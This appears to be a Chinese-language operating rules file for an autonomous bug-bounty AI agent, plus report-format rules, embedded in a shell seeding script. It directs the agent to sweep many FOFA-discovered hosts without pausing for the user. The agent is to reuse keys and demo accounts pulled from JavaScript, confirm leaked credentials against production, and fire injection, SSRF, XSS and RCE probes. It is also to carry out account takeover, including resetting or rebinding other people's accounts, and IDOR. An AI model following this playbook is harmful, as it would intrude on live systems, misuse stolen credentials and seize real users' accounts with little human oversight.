看见小程序 / APP / 客户端 / GraphQL / WebSocket / 批量导出 / Agent 工具 / 模板预览 / 文件转换 / 命令 RPC → 当**本站面**跟，不是「其它现场面」顺带。H5 墙后面包里的 `appId` / 小程序网关 / 客户端盐，按本站钥匙用。

### 4.1 先建接口清单

**有前端：** 打开业务页 → 全量抽 JS → `js/` → 分析 API/参数/鉴权 → 抓包补全 → 清单 → §4.2。

JS **不只抽 path**。有就写进清单，没有写「无」：

| 抽到什么 | 干什么 |
|----------|--------|
| `/api/` 路径 | 照旧进清单 |
| 签名盐、硬编码钥 | 自己算，打「只要 sign、不要 Cookie」的口 |
| 密文 id + 前端公钥 | 自己加密邻号再换（见 `idor-test.md`） |
| 异步 chunk、sourcemap、路由里 hidden/admin | 页面不展示也直接打对应 API |
| 写死的演示号、测试租户、体验入口 | **当钥匙用**。这和登录框喷 `admin/admin` 不是一类 |
| 会跑命令 / 渲染模板 / 表达式 / 文件转换 / 带命令的 RPC / Agent 工具 | 有就写进清单并开对应模块（对话工具见 `agent-tool-exec-test.md`）；**没有写「无」**。例子不是白名单，清单外的执行面照挖 |

「弱口令不当必做」只管登录框字典。JS / 页里的账密、演示租户不在禁里。

**降级（禁止卡死）：**

| 场景 | 做法 |
|------|------|
| 纯 API / 几乎无业务 JS | Swagger/OpenAPI、抓包、响应 link、常见网关 path |
| 打开是登录页 | **按 §4.1.1**：先找业务面，主业挖未登录。登录表单看得见的打通或证伪就停。清单里的发会话 / 重置 / 改绑 / 换票走 **§4.2.2**，不在表单上磨 |
| JS 下失败 / CDN 拦 | 抓包 + HTML 内联 + 已知 path，**禁止空等抽干** |
| 无对比账号 | 没号：未授权通了再换 id（§4.2.3）。有号按会话走 §4.2.3。不为第二号磨注册。禁止为「先登进去」停在登录表单 |

有前端却清单空就瞎 dir = 禁止；无 JS 就整站停工 = 禁止。

### 4.1.1 打开是登录页（硬 · 自由跳默认未登录）

**禁止读成「登录相关一律不管」。** 不管的是表单上的验证码、默认口、无限试。空密、跳步、改响应、JS 钥匙、登录接口上的 `tenant`/`moduleId`、旁边露出来的名单/详情，看得见就打。

打开是登录页 → 先找业务 API / 跳转后的业务 host → **主业**挖那边的未登录和有差分面的四件套。进了会话（用户给号 / JS 演示号 / 空密打通）→ 立刻转 §4.2.3，不要还对着业务口打引号。  
登录表单：看得见的面打通或证伪就停；繁琐验证 / 别人的身份页 / 同皮壳不耗。不耗的是别人的登录皮，自家换票 / callback / 绑定清单里有才打（§4.2.2），没有就 N/A。  
**看见登录页不是换资产。** 没找到业务面才算空壳。锁面没给账密时同样。用户当场给了号再补登录后。

业务面可能是另一个 host，也可能是**本 host 登录后面的网关 / API**。对着业务 API 挖未登录，不是对着登录表单挖。找不到另一个域名 ≠ 这摊没了。  
登录可能是自家的，也可能是别人的（SSO / CAS / OAuth / 统一认证，以及任意第三方身份页）。别人的登录页本身不审——判据是「登录页主人不是当前这摊业务」，不按产品名单。跟回这摊的业务面。

**怎么找业务面（不用登进去）：**  
`service=` / `redirect_uri=` / `callback=` / `returnUrl=` / `jumpUrl=` / `next=`；JS / `env.js` / `baseURL` / `apiHost` / `/prod-api`；302 Location；`X-Frame-Options: ALLOW-FROM`；同品牌 `api` / `admin` / `gateway` / 产品 host。

登录表单**可以测，不能无限磨**：

| 看得见就打，打通或证伪就停 | 不打 / 不当进度 |
|---------------------------|----------------|
| 空密、跳过密码步、改响应能进 | 验证码 OCR、滑块、默认口字典、无限试密 |
| JS 硬编码钥匙 | 对着用户名 / 密码框灌注入充四件套 |
| 登录接口上多出来的业务字段（`tenant` / `corpId` / `moduleId`）按注入打 | 同皮登录表单再挖一遍 |
| 登录旁边已经露出来的业务 path（名单 / 详情 / 统计）未授权照打 | 打开 `401-403-bypass` 磨登录 HTML；去审别人的 IdP 本身 |
| 中间件裸默认口（nacos 等）可一眼 | — |

**四件套打在业务 API 的业务参上。** 用户名 / 密码框不是业务参（不当注入四件套入口）。同一对字段上能出会话的空密 / 跳步 / 登录注入记 **任意登录**，见 §4.2.2。业务口全要令牌、登录前无参 → 四件套 N/A（原因写清），不要发明参。  
表单壳打通或证伪就停 ≠ 认证接口不用打。发会话 / 重置 / 改绑 / 自家换票 / 2FA 按 §4.2.2。  
**只有**跳转 / JS / 配置里一个业务面都抽不出、旁边也没有任何未登录业务口、清单也没有 §4.2.2 那类口 → 才记空壳换下一条。有业务面却停在登录表单或直接换 = 违规。

### 4.1.2 业务口全是同一登录码（同闸停 · 2026-08-18）

> **只纠节奏，不砍能力。** 教训：把「每个域名独立深挖 / JS 抽全」读成 FOFA leftover 每个 403、每个登录壳都开线程全矩阵；清单有了、四件套在同一登录码上勾完，报告不增，再开同产品下一个 host。

**先做（能力不砍）：** 抽 JS、建清单、标 METHOD；点完未登录例外（公开枚举、静态 JSON、缺参后仍出业务 JSON、名单/详情/统计）。回包按下面对照，不要把「暂时没出数」当成请登录。

| 回包长什么样 | 算什么 | 干什么 |
|--------------|--------|--------|
| 通篇就一句「请登录 / NotLogin」，没有 list、total、名单、详情 | 登录闸 | 四件套整段 N/A，别丢 `'` |
| 有 list / total / 业务字段，哪怕 `total=0`、数组是空的 | 有差分面 | 还得测（换参、换 id、注入） |
| 报错、500、超时，或长度/耗时和正常请求明显不一样 | 有差分面 | 还得测 |
| 缺个参数却吐出名单/详情 | 未登录例外 | 按 §4.2.1 打 |

**空列表是「出了结构、条数是 0」，不是请登录。** 只有整页都是同一句登录码、旁边也抠不出名单，才整段跳过。  
**停：** 换参打过，total 还是 0、也没有稳定报错/时间差 → 证伪换下一个，不许磨到出数。偶发 500/超时对照一两次，差不稳就停，别重试到通。

**同闸 = 同时满足：**

1. 业务 path 已经从 JS/网关抽出来  
2. 未登录例外已经点过  
3. 其余业务口是**同一家族回码**（登录失败 / 请重新登录 / NotLogin / 产品升级改造中 / 系统繁忙且无条数时间差分）  
4. **没有**未登录出他主体数据，也没有缺参之后吐名单/详情  

**然后停这个闸，不要再全矩阵：** 四件套对着同一登录码可以停。若清单里还有发会话 / 重置 / 改绑 / 换票且 **§4.2.2 没勾**，先收这组再记 done——不要对着「请登录」灌注入。同产品下一 host 若还是这套 `baseURL` + 同一回码 → **一眼差分**（抽 JS 看有没有新 path / 回码变没变），没有新例外就不另开全矩阵。FOFA **403 + 首页无业务 script + Apache/TAPISIX 禁目录** → 一口证伪标 cold，不开线程。

**禁止读成：** 看见登录页就换（仍违反 §4.1.1）；业务 API 不用抽；未登录例外也不打；回码变了出数 / 新 path / 新业务 host 也不跟；**认证口（登录/重置/改绑/换票）也不打**；把空列表 / 报错 / 超时当成请登录整段跳过。闸上再勾四件套、再开 sibling 线程、空列表上磨到出数 = 空转，不是深挖。

### 4.1.3 回包当线索（硬）

回包里新出现的 **id / 下载地址 / token / 内部 host / 角色字段** → 立刻进本站清单再打，不当垃圾、不换站丢掉。  
列表过了，附件和导出还要打一枪（父对象过了鉴权、子对象常没过）。

### 4.2 全类型矩阵（禁止偏科）

力气先砸哪认 `src-value-hunting.md` §1.1（未登录他主体 / 认证接管 / 换 id / 四件套含 XSS 同一档先打）。本节约类型探针，不另写一套优先级。

与 `src-value-hunting.md` 取并集，至少：未授权、越权/IDOR（**有会话与四件套同硬，见 §4.2.3**）、注入、SSRF、RCE 链、凭证（有账密接着挖；可用=认钥+不影响线上的能力例，落不落认 format）、弱口令（登录表单不当必做，见 §4.1.1；JS 演示号当钥匙）、敏感路径、XSS/CSRF、上传（别停在能传能下）、穿越、提权/逻辑（有会话见 §4.2.3）、**认证/会话（任意登录 / 账号接管见 §4.2.2）**、JWT/OAuth 等现场面（**CORS 不挖**）。落不落只认 `vuln-report-format.md`。

#### 4.2.1 硬四件套不得连日空窗（用户 2026-08-07 · 禁止空话）

> 用户点名：别只堆未授权读/同构列表；**注入、SSRF、XSS、RCE** 要真测。  
> **禁止**规则里写「做最低动作」这种糊弄话；下列是 **每站进矩阵时四类各自必须跑完的探针**（有入口就打，无入口才 N/A + 原因）。

| 类型 | 必须做的探针（有入口时） | 无入口才可 N/A |
|------|--------------------------|----------------|
| **注入** | 能看出条数变、内容变、或会去拉一个网址的口：上面 **每个** 查询/过滤/排序/关键字参数都测（基线 → 探针 → 差分）。只回「请登录」、没有业务字段 → 整段 N/A，不要挨个丢 `'`。**按栈选探针**，不要每站只打 SQL 单引号：JSON/Mongo 打操作符（`$ne`/`$gt`）；搜索框打 ES DSL 或列表 OR+total；Java 打 HQL/SpEL；有模板打 SSTI。SQL 面仍走 `'` / 布尔 / 延时（按库）→ WAF 编码。被拦了换位置（query / json / header / path）。出数或稳定时间差 → 打穿写报告。用户名/密码框不是业务参；登录接口上的 `tenant` / `corpId` / `moduleId` 有就打（§4.1.1） | 纯静态页、无任何 query/body 业务参；仅登录框无其它业务字段；回包只有登录码、没有业务字段（§4.1.2） |
| **SSRF** | 所有 URL/回调/webhook/file/fetch/import/preview/proxy 类参数：内网、云元数据、外带 DNS/HTTP；看是否跟请求、回显、打到自己的监听 | 清单与抓包里 **零** URL 拉取/代理类字段 |
| **XSS** | 反射：参数回显处打标签/事件；存储：能写的昵称/备注/留言/文件名再读回；结合是否无登录可读 | 无回显、无任何用户可控写入点（记原因） |
| **RCE 链** | 有命令/表达式/模板/反序列化/调试执行/危险上传入口就跟到能否执行或证伪；半条链继续跟 | **清单 + 抓包 + 回包**都没有这类 Sink。首页没扫到词不算；后来回包冒出 tool/模板/exec 立刻补打 |

| 硬禁 | 说明 |
|------|------|
| **连日空窗** | 连续多轮/跨自然日过程与报告只有未授权读/列表/配置，四件套 **没对有差分面的真实参数发过 payload** → 违规偏科；下一轮先补四件套 |
| **假进度** | findings 写「已测/N/A」但参数表上空；只扫未授权 200 就换站；**每个 path 喷过 `'` 但没有差分面** |
| **偏科节奏** | 未授权 list 写完就换 Host/换种子，同批接口的注入/SSRF/XSS/RCE 一眼没碰 |

**勾完 = 有差分的参数打穿或证伪**，不是每个 path 喷过 `'`。优先打：有 `total`/条数、会把输入吐回来、会去拉一个 URL、有模板/表达式的参。只回「请登录」且没有业务字段 → N/A，原因写「回码仅为登录闸」。空列表 / 报错 / 超时按 §4.1.2 对照，不是请登录；没差分就停。

细节参数矩阵与 src-value §3～§4 一致；**以有差分面的参数表勾完为准，不以「做了一下」为准。**

交付：打成了按 `vuln-report-format` 落盘。

#### 4.2.2 任意登录 / 账号接管（有入口勾完 · 防空转）

> **不是第五件套。** 四件套仍是注入 / SSRF / XSS / RCE。本条挂在「认证 / 会话」：有入口打完，无入口 N/A + 原因。表是**下限**，清单里还有新口照样跟，禁止读成「有号只准打这几枪」。  
> **和 §4.1.1 不抢：** 4.1.1 管表单壳（验证码 UI、默认口字典、同皮登录 HTML、别人的身份页）。本条管发会话、重置、改绑、自家换票 / callback、2FA 这些**接口**。表单壳停了 ≠ 这些口不用打。  
> 发码、滑块过了之后：回包有码、码绑不绑号、重置换人、空密进号仍打。细节见 `authbypass-test.md`、`logic-test.md` 账号节。

**没号**（自由跳默认、锁面没给号）— 每枪一次，进了或明确不行就下一项：

- **任意登录：** 空密 / 请求里删掉 `password`；跳过密码步，直接打真正发 Cookie/token 的口；改响应 `success` 且看有没有真会话；登录注入只看能不能出会话（不记四件套）；JWT `none` / 硬编码钥 / 客户端造票；自家换票、callback、绑定时改 `uid` / `openid`（别人的身份页本身不审，见 §4.1.1）  
- **接管：** 重置 / 验码回包里有没有 token 或码；有则拿去登录或走重置最后一步；最后一步把 `uid` / `email` / `phone` 换成别人的或邻近号；能构造两个身份时 A 的码填到 B  

**有号**（用户给了号、打进去了、已有会话）— 认证口仍按本条打「自己的会话 + 换别人身份」，不要把个人中心点一遍当进度。**业务对象上的越权/逻辑走 §4.2.3**，不要停在改绑/改密这几枪。

**用户会话不准踢掉：** 禁止调 `/logout`、`/signout`、`/revoke` 以及一切退出 / 注销 / 吊销。不测「退出后会话还在不在」（那一枪必须登出）。改绑 / 改密只看拿掉旧验会不会过；过了立刻改回原值。改不回去的（不知道原密、原邮箱）只看到回包是否接受就停，不要把用户号改成新密码或攻击者邮箱留下。不要在用户号上真改邮箱来测旧重置 token。

- 改绑手机 / 邮箱：拿掉旧密码、旧号验证（过了改回）  
- 改密：不带 `oldPassword`（过了改回；改不回就停在回包）  
- 重置走到最后一步，身份换成别人的（动的是别人的 uid，不是把用户自己的密改掉）  
- 自己的 Cookie 不动，改绑 / 改密 / 资料包里的 `uid` 换成别人的  
- 密码过了、2FA 没走完，会话能不能打改绑、改密、业务写  
- 任意登录只剩：低权票改 `role` / 换高权票；进了自己本来就能进的页不算  

单号：`uid` 换邻近或列表里抄来的，对得上别人再算；对不上记缺号。**禁止**为凑对照号回去磨注册 / 验证码。

**停（测完，不是空转）：** 无这类口（N/A + 原因）；或上表每枪已否。  
**空转（马上停）：** 验证码 OCR、默认口字典、同皮表单再喷、对着「请登录」灌四件套、为第二号磨注册。

#### 4.2.3 换 id / 对象图（没会话 ≠ 不换 id）

换 id = 能圈谁、圈哪条、哪个租户、哪个文件的参数都换，**不限字段名**。一个参或一堆复杂参都算。  
**没号：未授权通了再换 id。** 不登录已经出了业务数据，再换看出没出别人的。未授权没通，不换。  
**有号**（Cookie / token / 演示号 / JS 钥匙）走本节表：带着会话换。主业是越权 / 逻辑，不是继续对业务口打引号。四件套打在这些**业务参**上。

| 有就打完 | 无入口才 N/A |
|----------|----------------|
| **对象图**：列表 → 详情 → 附件/导出/审批，每层换 id（不限字段名） | 纯登录墙、抽不出对象 |
| **圈人圈数的参**：邻号 / 回包里抄的 / `0`/`-1`/空 / 复杂包里圈人的那些 | 回包和列表里一个可换的都没有（单号也先抄，**不准**直接放弃） |
| **写接口**加 `role` / `isAdmin` / `amount` / `status` / `vip`（多赋值得手再打穿；只改能改回去的） | 没有写接口 |
| **多步流程跳步**；领取 / 库存 / 券 / 审核 → 并发一枪 | 没有这类口 |

禁止为凑第二个号去磨注册。缺对照：用邻号和回包里的 id。细节见 `idor-test.md`、`logic-test.md`。

### 4.3 本站「本轮完成」= 可换站下限

不能等宇宙级勾完才换站。满足即可换：

1. §4.0 那几行已写（或确认抽不出业务对象才记空壳）  
2. 接口清单已建（默认或降级；JS 抽过钥匙表，无则写「无」）  
3. 类型矩阵按 §4.2 / §4.2.1 / **§4.2.2** / **有会话则 §4.2.3** **探针勾完**（无入口记 N/A + 原因，禁止空话；四件套按有差分面勾，不是每个 path 喷过）  
4. 高价值接口参数矩阵已覆盖（注入见有差分面的参数表）  
5. 打成了按 `vuln-report-format` 落盘（无洞不写空报告）  
6. 未耗在同皮镜像/已 covered 号段  
7. **打开是登录页**（§4.1.1）：业务面已找到并挖过未登录（或确认抽不出才记空壳）。登录表单看得见的面打通或证伪即可，不磨  
8. **同闸**（§4.1.2）：未登录例外已点、其余口同一登录码 → 四件套收口。清单里若还有 §4.2.2 的口，先勾完再记 done。同产品 sibling 一眼差分无新例外 → 记过，不算「种子还剩活面没挖」  
9. **认证口**（§4.2.2，不要写进 §4.1.1）：清单里有发会话 / 重置 / 改绑 / 换票 / 2FA → 探针勾完或 N/A + 原因。有口零 payload = 漏测，不算本轮完成  
10. **中危已落盘**，同一对象还没走到「能写 / 能看别人 / 能接管 / 能执行」→ **先升链，不换站**。文件通道通了转业务  
11. **本种子肥瘦：** 肥面（JS 多 / 后台 / 业务 JSON）打到对象图 + 有差分的参（有会话再加 §4.2.3）；瘦面（403 空壳、同闸、同皮无新 path）一眼证伪记过，不占满 15 分钟、不开线程全矩阵

有高危报告时，换站前按 `hunt-iter` 写一行拟进/拟补/不进（半分钟；写不进也算做完）。**并短表不是换站条件**，主控稍后合并。无高危 = 无拟进。  
**高价值苗头先打穿再换站：** 稳定注入/RCE 链/跨租户/未授权敏感读/可用凭证（认钥+不影响线上的能力例，不是抄到字符串）/任意登录进号/接管改密改绑 — 先验证写报告或证伪。  
**中危不是换站令：** 同一对象升链没走完，先跟。  
**必须换线：** 站不可达、人机死挡无替代 Host、纯废壳 — 记过换站，不提问停工。看见登录页 **不是** 换线理由。

### 4.4 站级节奏

1. 判锁面 or 自由跳  
2. **自由跳：** §1.0 + **§1.0.1 一种子闭环**（续挖/新开 → 种子多备 → 活筛 → 只搜这一个 S → 去重去废去非存活 → 股权闸 → 剩余活面全部挖完 → 才搜下一条 → 全 done 则随机/回扫）  
3. **锁面：** 资产簇多 host/业务流子域/同 host 多 path；不主动 FOFA 出圈  
4. §4.0 说清这摊 → 抽 JS（path + 钥匙）→ 清单（回包线索随时补）→ 力气按 `src-value` §1.1：没号未授权通了再换 id，再认证口/四件套；有号带着会话换 id/加字段再打四件套（含 XSS）→ 本轮完成  
5. 打成了按 `vuln-report-format` 落盘；中危同一对象先升链  
6. 长时间 reports 不增 → 自检 §2；瘦壳换站，肥面补未勾类型  

---

## 5. 心跳自检（每轮过一遍）

- [ ] 锁面还是自由跳？锁面是否误锁死或多 host 没跟 / 误出圈 FOFA？  
- [ ] 磁盘有 `*src经验.md` 才和短表并行打开；没有不算缺、不算少挖矩阵  
- [ ] 种子是否尽能力多备（业务名 + 全资 1～4 级 + 根域/备案），数量无上限？有没有误砍成固定条数？  
- [ ] FOFA/进站优质面是否把 **新注册根域** 回灌进种子队列（本种子挖完才搜，§1.1.1）？  
- [ ] **一种子闭环（§1.0.1）：** 是否搜一个 → 去重去废去非存活 → 剩下的挖完 → 才搜下一个？有没有多种子一次搜完？  
- [ ] 队列已落盘？pending/doing/done 更新了？续挖是否先跳过 done/covered？  
- [ ] P2 是否先活筛？死备案是否 cold？  
- [ ] 有没有条条蜂鸟？有没有参股公司当集团挖？  
- [ ] 全做过是否**先**随机新业务名、回扫是否先有新增证据？**本回合**连续 2 个 `0 新增` 是否已改随机？有没有开回扫工厂刷 covered？  
- [ ] 同 host 未测 path 有没有被误砍？清单/矩阵是否推进？  
- [ ] 本种子刚 done 是否已开下一条？最终回复有无继续类问句？  
- [ ] FOFA 配额尽是否停刷改挖已入库？进度是否在用条数充数？  
- [ ] **§2.1：** 本种子还剩未挖活面是否仍在开新种子 FOFA？未 §4.3 是否在用测绘充数？优质词是否只回灌未改道？多线程是否双 FOFA 工厂？  
- [ ] 近 15～20 分钟：清单 / 有差分面的四件套 payload / 有会话的换 id / 报告 是否至少一项在推进？（肥面抽 JS/对象图算推进；三无 + 只扩面 → 强制回深挖）  
- [ ] **本站注入参数表 / SSRF·URL 参 / XSS 回显写入 / RCE Sink 是否按 §4.2.1 打在有差分面上？** 有无连日只堆未授权读？有无每个 path 喷 `'` 充勾完？  
- [ ] 打开是登录页时：是否已找到并挖了业务面（本 host 网关或跳转后的 host）？有没有在登录表单上无限磨？（§4.1.1）  
- [ ] 清单里有发会话 / 重置 / 改绑 / 换票 / 2FA 时，§4.2.2 是否勾完或 N/A？有口零 payload 是漏测；磨表单 / 默认口是空转  
- [ ] 有会话时 §4.2.3 对象图 / 换 id / 加字段是否打了？有没有为第二号去磨注册？  
- [ ] 回包里的 id/url/token 有没有进本站清单？列表过了附件/导出打了没？  
- [ ] JS 是否只抽了 path、盐/密文 id/hidden 路由/演示号一眼没看？  
- [ ] 中危落了是否同一对象先升链？本种子是否拿瘦壳当肥面喷了全矩阵？  
- [ ] 业务口是否已经同闸（同一登录码、未登录例外点过）却还在开同产品 sibling 全矩阵？（§4.1.2）认证口若还没打，是否先收了 §4.2.2？  
- [ ] 本节约律有没有被误读成少挖/少搜/少类型？（有则按 §2.1.0 纠正，能力不封顶）  

---

## 6. 一句话

先判锁面/自由跳。  
**自由跳：** 种子尽能力多备（业务名 + 全资 1～4 级 + 根域/备案，**数量无上限**，大 SRC 几十上百条正常）→ 落盘队列 → 旧夹续挖跳过已挖已搜 → **一种子闭环（§1.0.1）：搜一个种子 → 去重去废去非存活 → 剩下的挖完 → 才搜下一个**（P2 先活筛；**禁止多种子一次搜完**）→ 百分百控股（蜂鸟仅存疑）→ **进站全矩阵（深挖优先 §2.1）** → **优质面只回灌不改道（§1.1.1）** → 一种子剩余挖完立刻下一条（不问继续）→ 全 done 则随机再搜或回扫新增。  
**锁面：** 资产簇多 host/业务流跟到底，不 FOFA 出圈。  
打成了按 `vuln-report-format` 落盘；空转自纠。  
**打开是登录页：** 先找业务面，主业挖未登录；登录表单看得见的打通或证伪就停。看见登录页不是换资产（§4.1.1）。业务口全是同一登录码且未登录例外已点过 → 同闸停，sibling 一眼差分，不另开全矩阵（§4.1.2）。  
**认证口**（发会话 / 重置 / 改绑 / 换票 / 2FA）有入口按 §4.2.2 勾完，无入口 N/A；表单壳不磨。打成进号或改掉别人的密 / 绑再按 format 落盘。  
**进站打法：** 先 §4.0 说清这摊；JS 抽钥匙不只有 path；回包线索进本站队列。力气按 `src-value` §1.1：没号未授权通了再换 id；有号带着会话换 id 再打四件套（含 XSS，不降权）。中危同一对象先升链。肥面深挖、瘦壳一眼。  
**注入/SSRF/XSS/RCE 按 §4.2.1 打在有差分面上，不得连日空窗**；四类同等催；按栈选探针；禁只堆未授权读；禁每个 path 喷 `'` 充勾完。  
**节奏口令：** 一种子搜→清洗→挖完剩余活面→才换种 FOFA；本种子内先清单后矩阵，先矩阵后换站；限流只挖池。本节约律只防扩面空转，**不砍**种子广度、类型深度与打穿能力。
SRC_DIG_SCOPE_WORKFLOW_EOF

seed_rule srcskill/vuln-report-format.md <<'SRC_VULN_REPORT_FORMAT_EOF'
# 漏洞报告写作格式（永久 · 唯一）

> **2026-08-19：** 报告规则就这两部分。  
> **以后报告规则只改本文件这两张表。** 加、减、改都在这里；禁止写到 Agents、src-value、dig-scope 或其它文件。

收洞类型细节仍可查 `src-value-hunting.md`；**写不写、怎么写、落哪** 以本文件为准。

---

## 一、正文怎么写（版式 + 8 块）

描述用第一人称大白话讲我做成了啥；危害只写最终能造成哪些伤害（权限面写全；有例子的必须举，没打过的不编），不是步骤。无科普。面向安全评审。

| 块 | 规则 |
|----|------|
| 漏洞标题 | 一行。谁的站、做成了啥。「匿名」= 打通时没有登录态，不是 omit 也能通。没登录态才写「匿名未授权」，禁止用「未登录」顶「未授权」。有登录态禁止写「匿名」「匿名未授权」，动别人的对象写「越权」。没登录态 + 他人 → 「匿名未授权」和「他人」都要带，不写「越权」；有会话 + 他人 → 写「越权」，可带「他人」。能批量的带「任意」或「批量」。细则见匿名闸。 |
| 目标网站URL | `目标网站URL：https://…` 人打开的站。 |
| 漏洞等级 | 只写中危、高危或严重。先得已经越权或未授权。**严重**（中了至少一条）：命令跑起来；进了别人的号或改掉别人的密/绑（人账号打登录出了真会话走这里，不走进高危）；钱真转走了，或录用/理赔/放行这种状态真变了。**高危**（没到严重，中了至少一条）：对得上人（手机/身份证/卡/证件照）；云密钥/token/库连接串/能当别人用的会话（须过认钥闸：假值对照生产认了，且认钥枪带出身份或列表；还没拿去进号、转钱。DSN/Redis/组件是连上并问出身份或列表即可，不是人登录后台的账号）；注入出了他主体的数；他人未公开的业务正文（内部知识库、未上架/未发布详情、工单正文这类，且是正文不是标题摘要）。个人空间日记/说说/相册过权限墙只出标题或摘要 → 中危。定级只对上面几条，禁止比上一份多一个字段就跳档。**中危**：有权限扩大或业务敏感，上面两条一条都没中。拿不准不写。 |
| 漏洞描述 | 标签「漏洞描述：」单独一行，冒号后换行再写正文。第一人称大白话：用「我」写做成了啥（没登录态：我没登录做成了啥；有会话：我拿自己的会话换成别人的对象做成了啥）。有登录态禁止写「我没登录」；没登录态禁止写成「我拿自己的会话」。禁止说明书腔（「该接口未做鉴权即可调用」）、禁止「攻击者」。没登录态打通：类型「匿名未授权」只写标题，描述里用「我没登录」说事实，不要用「未登录」当类型，不要段首再贴「匿名未授权。」。链条可以用大白话提，不要把接口表抄进描述（完整 URL 归涉及接口清单）。不贴包、不写复现、不列伤害清单（伤害归危害）。硬编码/凭证/密钥从 JS 出来的：描述里必须写完整实值，并附完整 JS 地址（http(s) 全路径，不要只写文件名）；接口清单里的出处不能替代这一句。正文要换行，不要挤成一行。 |
| 漏洞危害 | 标签「漏洞危害：」单独一行，冒号后换行再写正文。只写最终能造成哪些伤害。按这扇门打开后、拿到的身份/钥/数据本身的真实权限和数据面写全（认菜单、角色说明、已打通的写口、这把钥实际能调的能力，猜的不写），不按复现打穿了几枪来裁。凭证洞常规两枪只是复现举例，不是危害上限，危害仍按这把身份的面写全。进了后台只证明能看，伤害里仍要写能改、能删；拿到管理钥，能拉账单/退款/转账的都要写，不要求真去退一笔。没打开的门不要写（只读到角色名就不要写能改价；改密成功但换票失败，「能进号」不要写进危害，边界放描述用「我」说清）。不是步骤，不要第一层、第二层，不要「本人 POST / 换参 / 整包」。每种伤害单独一行，大白话点明伤到什么（人、号、钱、内部正文、能改能删）。有例子的必须举例：泄露就举一两个姓名/手机号/地址/证件或内部标题实值；证明过改动的就举改成了什么。没真打过的权限面（能删、能退款）照写伤害，不要编「删了谁」「退了哪笔」。能批量就写「能批量泄露/改」，不要写怎么遍历。禁止「不限于」「等敏感信息」这类糊，禁止只写「泄露个人信息」却不举例。 |
| 涉及接口清单 | 只列复现步骤里真正打过的接口，按1、2、3编号。每条写完整地址和出处；取自 JS 附完整 JS 链接，取自页面附文档 URL。抄参用的 JS 只当出处附在那条接口上，不要把 JS 或首页单独列一条。对照、没打的接口不要列。 |
| 复现步骤 | 用1、2、3逐条写，只留打穿必要的包，审核能顺着打完。每步只一个整包。只为抄参、做对照、看一眼页面长什么样的包不成步。打穿证据就在页面上的（身份页 200、XSS 回显）仍要成步。参数从哪份 JS、上一步哪个字段抄的，写在用到它的那一步描述里，附完整 JS 链接或接口地址。对照（改前 / 原站）也写在这一步描述里，不要另开一步再打一包。纯数字可遍历不用解释来源。每步描述一两句说完：打了什么、等于证明了什么。步骤里不要反复写不登录/不带 Cookie。步骤里不要写回包、不要贴回包。包后不许跟回包或「预期」。下一步要用解密/签名结果的，单独做一步：这步写怎么跑、解出什么、下一步拿它干什么。凭证/密钥/私钥/已进号的账号：没过「认钥闸」不许写这篇。第一步认钥或进号（假值对照写在该步描述里；这一枪须已经带出身份或列表）。常规再一枪只读（第一枪已带出则换另一类只读）。再打就会动线上 → 一枪也交（仍须这一枪已带出身份或列表）。禁止用退款/改别人/转钱凑例。 |
| 整包（步骤里） | 每步只贴一个可复制整包。Host 紧挨请求行下一行。Accept / Accept-Language: zh-CN / Accept-Encoding: gzip, deflate / User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0) / Connection: close 写齐。有 body 再加 Content-Type、Content-Length、Cache-Control: no-cache。页面有的 Origin、Referer 写上。没登录态打通不写 Cookie；有登录态复现 Cookie 写完整实值。禁止：挖的时候带着会话，交报告时把 Cookie 拿掉再标匿名。包结束直接＃。不要写「预期」，步骤里不要写回包、不要贴回包。 |
| 修复建议 | 贴合当前漏洞给出精准、可落地、针对性强的整改方案，简短直白。 |
| 排版 | 漏洞标题、目标网站URL、漏洞等级各占一行，中间不空行、不分＃。漏洞描述：、漏洞危害：冒号后换行，正文不要跟在冒号同一行。危害每种伤害单独一行，不要第一层第二层。大块之间单独一行全角＃，禁止半角#。复现里每一条步骤换行，条与条之间一行＃。复现结束后一行＃再接修复建议。不出现多余空行。 |
| 落盘文件 | 放到 `Desktop\{任务}_SRC挖洞\报告\`。文件名就是漏洞标题那一行，后缀 `.md`。桌面根禁止散落报告。CRLF。dig 不进正文。无洞不写空报告。 |

---

## 二、落不落 / 落哪

| 条 | 规则 |
|----|------|
| 不写 | 半条链。弱口令没进号。无密钥壳（含没账密的 DSN、health、版本、只有 host 没密码）。凭证/密钥/私钥没过「认钥闸」（只抄到字符串、没假值对照、认钥枪带不出身份或列表）→ 不写。进了号但没有身份或列表的只读例 → 不写。占位/过期/真假同一句错 → 不写。手机号加解密钥（前端 AES/SM4/RSA、给手机号加密的 salt/iv/钥，PoC 密文能解开的那种）→ 不写。仅未授权 up/down。低危、信息级、配置提醒、证书过期（无利用链）、缺安全头。CORS。未授权发短信/邮件/验证码。滑块/无限试密（没进号）。本职可读、本账号权限内、公开运营数据、指纹、临时 OSS 图链、公开说明文。仅害自己的 CSRF。接口 200 有 JSON。拿不准也不写。向用户也不提「发现低危 xxx」。发码/滑块/文件通道打成进号、改密、可执行链的，按那个洞写，不按「发码」「上传」单独成篇。 |
| 立刻写 | 中危、高危、严重，确认了立刻写进 `报告/`，禁止攒到最后。没过匿名闸、认钥闸不算确认，不许落盘。 |
| 匿名闸 | 标题要写「匿名」之前先问：打通那包有没有 Cookie、这次挖有没有登录态。有会话 → 不写匿名，改越权，描述用「我拿自己的会话」，Cookie 写完整实值。omit 通了不算没登录。 |
| 认钥闸 | **抄到钥不算洞，生产认了才写。** 私钥 / PEM / SSH / AKSK / token / 连接串 / JWT / 能当别人用的会话，都先过闸再落盘。过闸 = 假值对照生产认了，且认钥枪带出身份或列表（SSH：假钥 Permission denied，真钥 Hello 用户名）。没过不写。抄到字符串就交 = 禁止。第一枪已带出身份则再换一类不影响线上的只读；再打就会动线上 → 一枪也交（仍须已带出身份或列表）。 |
| 别重复交 | 本次任务 `报告/` 已有一模一样的洞（同一类型打在同一条 url，换 id / 多带参仍算同一条）→ 不写。同类型不同 url、或同 url 不同类型，都照写。同一条洞挖大了改原篇，不另开。 |
| 密钥放哪 | 密钥实值、完整 JS 只进正式报告，不进短表/知识库。 |
| 清理 | 用户说清理：没有报告 → 整根任务夹删掉；有报告 → 只留 `资产/` 和 `报告/`。不动浏览器里存的账号密码。 |
SRC_VULN_REPORT_FORMAT_EOF

seed_rule src/equity-gate.md <<'EQUITY_GATE_EOF'
# 股权范围闸（scope 候选归属判据）——源自 srcskill dig-scope-workflow §3.2.0 实战口径

